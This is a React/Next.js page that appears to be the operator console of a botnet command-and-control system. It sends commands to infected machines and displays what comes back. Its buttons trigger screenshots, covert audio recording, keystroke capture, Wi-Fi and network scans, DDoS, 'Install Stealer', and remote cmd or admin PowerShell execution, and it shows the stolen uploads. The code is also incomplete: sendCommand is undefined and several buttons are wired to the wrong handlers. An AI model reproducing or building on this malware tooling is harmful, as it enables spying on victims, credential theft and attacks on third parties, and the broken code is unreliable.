"use client"
import {
    Alert, AlertIcon,
    Breadcrumb,
    BreadcrumbItem,
    InputLeftElement,
    BreadcrumbLink,
    Button, Input, InputGroup, InputRightElement, Text, useToast,
} from '@chakra-ui/react'


import Terminal, {ColorMode, TerminalOutput} from 'react-terminal-ui';

import {useParams} from "next/navigation";
import {useEffect, useState} from "react";

import C2TerminalOutput from "@/components/C2TerminalOutput";
import BotTerminalOutput from "@/components/BotTerminalOutput";

type TerminalLine = typeof C2TerminalOutput | typeof BotTerminalOutput;

export interface Channel {
    botId : string;
    messages: any[]
    commands: any[]
}

const backendUrl = "http://10.0.0.24:3000/backend";
const pullingInterval = 3000;

export default function BotDetailPage() {

    const params = useParams();
    const currentBot =  params.id as string;

    const [channel, setChannel] = useState<Channel | null>(null)
    const [loading, setLoading] = useState<boolean>(false)
    const [command, setCommand] = useState<string>("")

    const handleCommandChange = (event) => {
        setCommand(event.target.value)
        console.log(event.target.value)
    }



    const toast = useToast()

    useEffect(() => {
        const timer = setInterval(() => {
            getChannel();
        }, pullingInterval);
        return () => clearInterval(timer);
    }, []);

    async function getChannel() {
        setLoading(true)
        const url = backendUrl + "/channels";
        const res = await fetch(url);
        const data = await res.json();
        console.log(data);
        const botChannel = data.find((c: Channel) => c.botId === currentBot)
        setChannel(botChannel)
        setLoading(false)
    }

    async function handleRefresh() {
        await getChannel()
    }

    function commandSent() {
        toast({
            title: 'Command sent sucessfully',
            description: "The command was sent to the bot",
            status: 'success',
            duration: 1000,
            isClosable: true,
        })
    }

    async function handleClear() {

        const payload = {
            "botId" : currentBot,
            "name" : "ClearCommands",
            "args" : {}
        }

        const res = await fetch(backendUrl + "/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })
        commandSent()
        await getChannel()
    }

    async function handlePing() {

    }

    async function handleScreen()  {
        const res = await sendCommand(currentBot, "Screenshot", {})
        commandSent()
        await getChannel()
    }

    async function handleAudio()  {

        const res = await sendCommand(currentBot, "AudioCapture", {
            length: 10,
            path: "C:\\Users\\john\\test.wav"
        })
        commandSent()
        await getChannel()
    }

    async function handleSystemInfo() {

        const res = await sendCommand(currentBot, "GetSysInfo", {})

        commandSent()
    }

    async function handleFile() {
        throw new Error('Function not implemented.');
    }

    async function handlePublicIp(){

        const res =  await sendCommand(currentBot, "GetPublicIp", {})
        commandSent()

    }

    async function handlePrivateIp() {

        const res =  await sendCommand(currentBot, "GetPrivateIp", {})
        commandSent()
    }

    async function handleInstallPython() {
        const res =  await sendCommand(currentBot, "InstallPython", {})
        commandSent()
    }

    async function handleInstallIpScanner() {
        const res =  await sendCommand(currentBot, "InstallIpScanner", {})
        commandSent()
    }

    async function handlePullingRate() {

        const res =  await sendCommand(currentBot, "SetPullingRate", {
            command: "whoami"
        })

        commandSent()
    }

    async function handleGateway() {
        const res =  await sendCommand(currentBot, "Gateway", {
            command: "whoami"
        })

        commandSent()
    }

    async function handleWifi() {

        const res =  await sendCommand(currentBot, "WifiList", {})

        commandSent()
    }

    async function handleDdos() {

        const res =  await sendCommand(currentBot, "Ddos", {})
        commandSent()

    }

    async function handleNetworkScan() {
        const res =  await sendCommand(currentBot, "NetworkScan", {})
        commandSent()
    }

    async function handleCmd() {
        const res =  await sendCommand(currentBot, "RunCommand", {})
        setCommand("")
        commandSent()
    }

    async function handleAdminPowershell() {

        const res =  await sendCommand(currentBot, "PowershellAdmin", {
            command: command
        })

        setCommand("")
        commandSent()
    }


    async function handleKeyboardData() {
        const res =  await sendCommand(currentBot, "GetKeyboardData", {})
        commandSent()
    }


    function renderMessage(message: any) {
        if (message.from === "c2") {

            if (message.uploadType === "screen") {
                return (
                    <TerminalOutput key={message}>
                        <img src={backendUrl + "/storage/" + message.upload } alt={ message.upload} width={512} height={512}/>
                    </TerminalOutput>
                )
            } else if (message.uploadType === "audio") {
                return (
                    <TerminalOutput key={message}>
                        <figure>
                            <figcaption>Listen to the T-Rex:</figcaption>
                            <audio controls src={backendUrl + "/storage/" + message.upload }></audio>
                            <a href={backendUrl + "/storage/" + message.upload }> Download audio </a>
                        </figure>
                    </TerminalOutput>
                )
            } else if (message.uploadType === "file") {
                return (
                    <TerminalOutput key={message}>
                        <a href={backendUrl + "/storage/" + message.upload }> Download file </a>
                    </TerminalOutput>
                )
            }
            return <TerminalOutput key={message}>{"$root@C2 " + message.message}</TerminalOutput>
        } else {
            return <TerminalOutput key={message}>{ "$root@Bot " + message.message}</TerminalOutput>
        }
    }






    return (
        <main className="flex flex-wrap gap-4">
            <div className={"flex basis-full bg-gray-400  p-6 "}>
                <Breadcrumb>
                    <BreadcrumbItem>
                        <BreadcrumbLink href='/'>Dashboard</BreadcrumbLink>
                    </BreadcrumbItem>

                    <BreadcrumbItem isCurrentPage>
                        <BreadcrumbLink href={'/bots/'+currentBot}>Bot #{currentBot}</BreadcrumbLink>
                    </BreadcrumbItem>
                </Breadcrumb>
            </div>
            <div className={"flex basis-full flex-wrap p-2"}>
                <div className={"flex basis-full justify-between"}>
                    <h1>Bot Detail</h1>
                    <div className={"flex gap-4"}>
                        <Button colorScheme='blue' onClick={handleRefresh} isLoading={loading}>Refresh</Button>
                        <Button colorScheme='red' onClick={handleClear} isLoading={loading}>Clear Command</Button>
                    </div>
                </div>
                <div className={"flex basis-full gap-2 flex-wrap"}>
                    <div className={"flex gap-2 basis-full"}>
                        <Button colorScheme='blue' onClick={handleSystemInfo}>Get System Info</Button>
                        <Button colorScheme='blue' onClick={handlePublicIp}>Get Public Ip</Button>
                        <Button colorScheme='blue' onClick={handlePrivateIp}>Get Private Ip</Button>
                    </div>

                    <div className={"flex gap-2 basis-full"}>
                        <Button colorScheme='green' onClick={handleAudio}>Record audio</Button>
                        <Button colorScheme='green' onClick={handleScreen}>Screenshot</Button>
                        <Button colorScheme='green' onClick={handleWifi}>Wifi list</Button>
                        <Button colorScheme='green' onClick={handleDdos}>Ddos</Button>
                        <Button colorScheme='green' onClick={handleNetworkScan}>Network Scan</Button>
                        <Button colorScheme='green' onClick={handleKeyboardData}>Keyboard Data</Button>
                        <Button colorScheme='green' onClick={handleKeyboardData}>Grab file</Button>
                        <Button colorScheme='green' onClick={handleKeyboardData}>Send file</Button>

                    </div>
                    <div className={"flex gap-2 basis-full"}>
                        <Button colorScheme='yellow' onClick={handleFile}>Get File</Button>
                        <Button colorScheme='yellow' onClick={handlePing}>Ping</Button>
                        <Button colorScheme='yellow' onClick={handleGateway}>Set Relay</Button>
                        <Button colorScheme='yellow' onClick={handlePullingRate}>Pulling Rate</Button>
                        <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Ip Scanner</Button>
                        <Button colorScheme='yellow' onClick={handleInstallIpScanner}>Install Stealer</Button>
                        <Button colorScheme='yellow' onClick={handleInstallPython}>Install Python</Button>
                    </div>

                </div>
            </div>

            <div className={"flex basis-full flex-wrap p-4 gap-4"}>
                <div className={"flex basis-full"}>
                    <InputGroup size='md'>
                        <InputLeftElement
                            pointerEvents='none'
                            color='gray.300'
                            fontSize='1.2em'
                        >
                            $
                        </InputLeftElement>
                        <Input pr='4.5rem'   value={command} onChange={handleCommandChange}/>
                        <InputRightElement className={"gap-2"} width='20rem'>
                            <Button size='sm' onClick={handleCmd} >Send as Cmd</Button>
                            <Button size='sm' onClick={handleAdminPowershell}>Send as Admin Powershell</Button>
                        </InputRightElement>
                    </InputGroup>
                </div>
            </div>
            <div className={"flex basis-full flex-wrap p-4"}>
                <Terminal name='Bot channel' colorMode={ ColorMode.Dark }>
                    {channel && channel.messages.map((m) => {
                        return renderMessage(m)
                    })}
                </Terminal>
            </div>
        </main>
    )

}
